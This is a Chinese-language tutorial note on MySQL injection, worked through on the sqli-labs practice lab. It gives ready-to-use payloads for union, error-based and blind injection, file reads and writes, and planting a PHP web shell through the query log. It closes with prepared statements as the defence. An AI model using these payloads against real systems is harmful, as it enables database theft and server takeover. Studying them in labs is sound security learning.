---
data: 2024-07-04
tags:
  - 常见漏洞
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18284882
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/Sql注入/Sql注入|Sql注入]]"
title: sql注入初识
---
# mysql注入

## 前置知识

mysql语句，php表单数据处理。

## 功能展示

以sqli_libs为例子。

在Less-1中，sql语句的合成是这样的。

我们提交的url为

```
http://localhost/sqli-labs-master/Less-1/?id=1
```

即拼接为

```
$sql="SELECT * FROM users WHERE id='1' LIMIT 0,1"
```

即查询出表users中id为1的数据。

## 攻击原理概述

注意id的内容是直接进行拼接，没有进行任何处理，即对用户提交的数据完全信任。（在开发中我们要对一切数据都保有恶意）。

如果我们此时输入

```
http://localhost/sqli-labs-master/Less-1/?id=-2' union select 1,database(),3--+
```

```
sql="SELECT * FROM users WHERE id='-2' union select 1,database(),3--+' LIMIT 0,1"
```

我们即执行了一次对数据库的查询。

## 联合注入攻击过程

### 查明闭合结构
> 上文我展示了mysql攻击的基本原理，但在实际攻击中，不会如此简单。


首先我们要猜测sql语句查询结构。同过对id输入不同形式的数据来进行测试。

```
SELECT * FROM users WHERE id='1' or 1=1#LIMIT 0,1
%23为#url编码了
```

`#为sql的注释符号`

```
id='1'  or 1=1%23
```

有很多教程直接使用1'#（%23为url编码了）登录成功来说明为id闭合结构为

```
'id'
```

其实这样是不正确的的，因为你自己进行了尝试就会发现，输入1"#也可以登录，甚至)也可以。所以为什么会发生这种原因，看其本质是在sql语句中，`''`包裹的语句会被识别为字符串，其中命令包括注释都不会执行，而查询为数字类型，就会取第一个字符数字，否则报错。

所以我们注入的时候最好加入order by 999来测试是否成功执行。或者有多个正确的时候，选取内有'与"的

### 查询表字段结构

> 即查明数据库的表有多少的字段，为我们后文使用union提供基础信息


```
?id=1' order by 3%23;
```

orde by 是把数据按照指定字段进行排序。我们使用数字就是以表中的第几个字段进行排排序，即可根据执行是否成功，来判断字段有多少。

### 查询数据库

```
SELECT * FROM users WHERE id='1' union select 1,database(),2;
```

union即把2张表数据合到一张表上，但是2张表结构要相同。所以上文中使用order by是进行结构的探测。知道了表结构字段有3个，我们即通过select输出数字来控制字段的多少。

同时注意字段的展示位置的问题。

页面进行回显的时侯，会输出表uesrname与password内容。但只会输出第一行的数据。我们即要让这部分的数据为空，为我们的想要的数据腾出空间。

### 查询数据库表

> information_schema

> 即数据库的结构表，其中记录了数据库的表，和各个表的字段的结构。

> group_conca

> 把多行数据进行和并，在一行数据中进行输出。


```
-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```

```
(select group_concat(table_name) from information_schema.tables where table_schema=database())
```

### 查询表结构

```
select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
```

### 查询字段

```
-1 union select 1,group_concat(username),2 from users
```

## 报错注入

### Big数据溢出

```
select exp(~(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)a))
```

exp(int)即取e的次方。我们知道int类型是有最大数值的.如果我们超出范围，就会报错。

> 注意这个漏洞适用数据库版本为5.5.5~5.5.49


我们在来了解~是取反符号,0的补码为 64 个‘0‘加 1 个’1‘，位取反后就是 64 个’1‘，转换为10进制后就是 18446744073709551615


同时我们要知道当语句执行成功时，会返回一个0.因此我们就可以构造出一个嵌套sql语句查询。

语句的执行顺序是

即首先从exp进行，进入第2层的select语句，然后进入最里层执行其中的查询语句。然后结果形成一个结果表进行查询，在由第2层进行进行查询。查询成功返回0，进行取反后为18446744073709551615（sql中最大的无符号整数）。然后由exp来进行取指数，超出最大整数。进行报错，注意这时最里面的执行成功信息就会显示在报错信息中。

### 参数格式错误

#### updatexml()

```
UPDATEXML(xml_string, xpath_expression, new_value)
```
- xml_string：要更新的原始 XML 文本。
- xpath_expression：用于指定要更新的 XML 节点的 XPath 表达式。
- new_value：要设置的新值

#### extractvalue()
```
EXTRACTVALUE(xml_string, xpath_expression)
```

- xml_string：要从中提取值的原始 XML 文本。
- xpath_expression：用于指定要提取的 XML 节点的 XPath 表达式。

以updatexml（）为例
```
id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database() ),0x7e),3)%23
```

简化一下格式即
```
updatexml(1,concat(0x7e,(查询语句),0x7e),3)%23
```

我们首要目的即要使我们的语句不合法，产生错误。我们即使用0x7e（即~号），形成不合法语句。因为有时查询语句结果为合法Xpath格式的字符串。然后使用concat把结果合并即可。
但是这样有一个问题就是报错的文字窗口是有限的，我们没办法看所有的数据。

我们就可以利用limit来进行单个的查询，不使用group_concat。

```
 updatexml(1,concat(0x7e,(select username from users limit 2,1),0x7e),3)--+
```

### 主键重复错误

我们先来看整体的语句
```
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```
看起来是不是很复杂，我们来进行对应的一个拆解
```
先拆出内部的sql语句
select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x

在进行分解
select count(*),concat(user(),floor(rand(0)*2))x

information_schema.tables group by x

提取最关键的函数
floor(rand(0)*2))x
group by x
```

#### 语句解释
##### 函数使用
```
rand(): 生成一个在 0 到 1 之间的随机数。使用固定种子（如 0）可以产生可预测的伪随机数。
floor(): 此函数返回小于或等于其参数的最大整数。与 rand() 结合使用，可以产生 0 或 1。
group by: 用于将查询结果分组，使得每个组只返回一次。
count(*): 统计每个组中的记录数。
```

```
floor(rand(0)*2))
```
rand() 是返回 0 到 1 之间的随机数，那么floor（rand（0））产生的数就只是0，但是如果我们把rand产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor() 就可以产生确定的两个数了。也就是 0 和 1了。实际的伪随机数为011011
```
group by: 用于将查询结果分组。
count(*): 统计每个组中的记录数。
```
假设我们有一个名为 `orders` 的表，结构如下：

| order_id | customer_id | amount |
| -------- | ----------- | ------ |
| 1        | 1           | 100    |
| 2        | 1           | 150    |
| 3        | 2           | 200    |
| 4        | 2           | 250    |
| 5        | 1           | 300    |
| 6        | 3           | 400    |
```
SELECT customer_id, COUNT(*) AS order_count
FROM orders
GROUP BY customer_id;
```

| customer_id | order_count |
| ----------- | ----------- |
| 1           | 3           |
| 2           | 2           |
| 3           | 1           |
##### **主键**
- 主键是数据库表中的一个字段（或多个字段的组合），用于唯一标识表中的每一条记录。主键的值必须是唯一的，且不能为空。
如果尝试插入一条记录 `user_id = 1` 的新记录，数据库会返回主键重复错误。

|user_id|username|
|---|---|
|1|Alice|
|2|Bob|
##### 别名
- 别名是给表或列指定的临时名称，以便在查询中更容易引用和理解。使用别名不会改变表或列的实际名称。
假设我们有一个 `employees` 表：

|emp_id|emp_name|
|---|---|
|1|John Doe|
|2|Jane Smith|

可以使用别名来简化查询：
```
SELECT emp_id AS ID, emp_name AS Name FROM employees;
```
执行后，结果将显示为：

| ID  | Name       |
| --- | ---------- |
| 1   | John Doe   |
| 2   | Jane Smith |
#### 报错原理
们先了解group()与count(`*`)的工作原理。
我们进行分组后，会先创建一个虚拟表,这个虚拟表中只有俩个字段，一个是key，一个是count(`*`).用于给count(`*`)实现计数功能。那么功能是如何实现的。

```
select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x
```

| key | count(*) |
| --- | -------- |
|     |          |
我们要记住floor(rand(0)\*2)即x生成为伪随机数为011011.语句执行会找分组的字段x,我们使用了别名会计算x，这时为0.发现表中没有，就会在key进行插入,这个值就会在进行计算为1,然后进行插入，并把count(\*)加1

| key | count(\*) |
| --- | --------- |
| 1   | 1         |
这时你会发现，一次组的寻找实际进行了2次计算。同时由于floor(rand(0)\*2)，发现实际2次计算结果可能还不一样。
然后语句继续执行，也是先找分组字段计算为1，发现表中有数据流，就会直接在count(\*)+1.

| key | count(\*) |
| --- | --------- |
| 1   | 2         |

然后继续执行，字段执行发现为0，发现表中没有key,为0的。就会进行插入，然后又会发生计算，这次结果为
1.但是这时候表中key已经有1了，就会发生主键重复的错误。

但是我们在实际环境中外层还有select语句，不能直接把2个字段直接输出。我们既要把它构造为一个字段。
```
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```
即构造完成。
### 列名重复错误

mysql列名重复会报错。name_const(name,value) 返回给定值。当用来产生一个结果集合列时，name_const促使该列使用给定名称。

```
mysql> select name_const(version(),1);
+--------+
| 5.7.20 |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)
```

构造重复的列
```
select * from (select name_const(version(),1),name_const(version(),1))a;
```
高版本mysql修复了这个问题，要求第一个参数必须为常量，所以我们只能去查询user(),version()一些系统常量。  
但在低版本中（Mysql 5.0.12 <= 版本 <= Mysql 5.0.51），可以成功利用。
```
select * from (select name_const((select database()),1),name_const((select database()),1))a;
```
## 文件写入

即使用sql语句来写入一句话木马。
我们先来看看注入语句。

```
1')) union select 1,2,3 into outfile "C:\\phpStudy\\WWW\\sqli\\Less-7\\test.txt" -- #
```

这里使用了into outfil，即将数据写入一个文件。但是我们要知道的是，使用这个函数是有很多限制的。

我们要有文件的创建权限，和文件的读写权限。并且我们写的文件名在目录不存在。

## 利用日志写文件
我们可以通过设置日志配置信息，设置日志文件后缀和文件生成位置，来达到写入shell的效果。
```
show variables like 'general_log%'; 查询日志
show variables like '%slow_query_log%'; 慢查询日志


set global general_log = 'ON'; 查询日志 
set global slow_query_log=1; 慢查询日志

set global general_log_file="D:/phpstudy_pro/WWW/test.php"; 查询日志 set global slow_query_log_file='D:/phpstudy_pro/WWW/test.php’; 慢查询日志

select '<?php phpinfo() ?>'; 查询日志 
select '<?php phpinfo() ?>' or sleep(11); 慢查询日志
```

## 盲注

即我们没有查询数据的信息回显，并且也没有报错信息可以进行显示。此时我们就要考虑进行盲注了。
### 函数
用于对字符串进行截取，如substring(),mid(),substr()。他们的使用方法是相同，第一个参数是使用字符串，而第二个与第三个参数是指定字符串的开始位置和截取长度。
还有一些其他常用与条件判断的函数
length()返回字符串的长度。ord(),与ascii()输出字符的ascii码。if(条件,语句2,语句3)如果条件成立则进入语句2，不成立则进如语句3.sleep(n)则是将程序挂起，也可以理解为挂起N秒
### 布尔盲注

我们先看看语句
```
and select ord(substr(database(),1,1)) > 120
```

即通过substr来吧字符串进行提取为单个字符，然后使用ord把单个字符进行转换为数字(ascii码)，然后通过2分发比较得到字符asccii码信息。然后在进行还原ascii码，得到字符。
所以格式即为
```
and select ord(substr((查询语句),1,1)) > 120
```

即当我们语句成立是为一种页面显示，我们语句不成立时为另一种页面。时就适用使用布尔盲注。

### 时间盲注

这种条件的利用更加严格，我们就始终只有一个页面，没有其他的页面返还给我们。

```
and if(ascii(substr(database(),1,1))>114,sleep(5),1)
```

即当我们条件成立的时候会进行休眠5秒，我们的页面感受即为加载了4秒。所以一但我们都语句正确，页面即会加载更长时间。

这种注入方法时间耗费比较长，一般不会利用。

## 2次注入

其底层原理是有两个地方的sql语句不同，但会操作同一数据。因为两个语句的结构不同，我们就可以使一些数据在不同结构实现不同功能，以sqli-labs-24为例子。

创建用户语句

更改密码语句

当我们创建用户名为admin'#时

此时的admin'#是不会生效的。因为闭合方式为",但是更改密码的语句是

这时闭合符号即为',所以此时注释生效，我们更改的是admin账号的密码。

## 堆叠注入

即我们一次注入多条语句来进行注入，实现我们想要执行的语句。

但是利用条件十分苛刻，而且通常是没有回显的。只有sql执行函数可以执行多条语句时，才可以执行这种语句。

这是可以执行的堆叠语句的后台执行函数。

而这样设计的sql语句执行就无法实现堆叠注入。

## 注入位置

当我们有多个参数的时候，就有可能大多数的数据会进行过滤，我们就要进行思考那一个是我们的注入点了。我们可以通过构造报错语句来测试我们的语句是否执行。

```
1' order by 999#
```

即当我们语句错误即为执行成功。

由上文可知，我们的正确注入位置为password.

同时还有一些其他位置可能存在注入，如User-Agent，Referer，Cookie。

## 文件读取
- 用户权限足够高，尽量具有root权限。
- secure_file_priv 选项不对文件读写权限限制
- 知道绝对物理路径
- 能够使用联合查询（sql注入时）
### 权限查看
```
and (select File_priv from mysql.user where user='root' and host='localhost')='Y'%23
show global variables like '%secure%';
```
### 文件读写
```
select 1,2,load_file('D://test.txt')
select 1,2 into outfile '/var/www/html/secret.php'
dumpfile
```
### secure_file_priv 选项
- secure_file_prive=null 限制mysqld 不允许导入和导出
- secure_file_priv=/tmp/ 限制mysqld 的导入和导出只能在/tmp/目录下
- secure_file_priv= 不对mysqld 的导入和导出做限制

# 预编译
通常来说，一条SQL语句从传入到运行经历了生成语法树、执行计划优化、执行这几个阶段。在预编译过程中，数据库首先接收到带有预编译占位符?的SQL语句，解析生成语法树(Lex)，并缓存在cache中，然后接收对应的参数信息，从cache中取出语法树设置参数，然后再进行优化和执行。由于参数信息传入前语法树就已生成，执行的语法结构也就无法因参数而改变，自然也就杜绝了SQL注入的出现。这样一个深刻而简单的原因，相信已经解答了我们最开始的疑问。
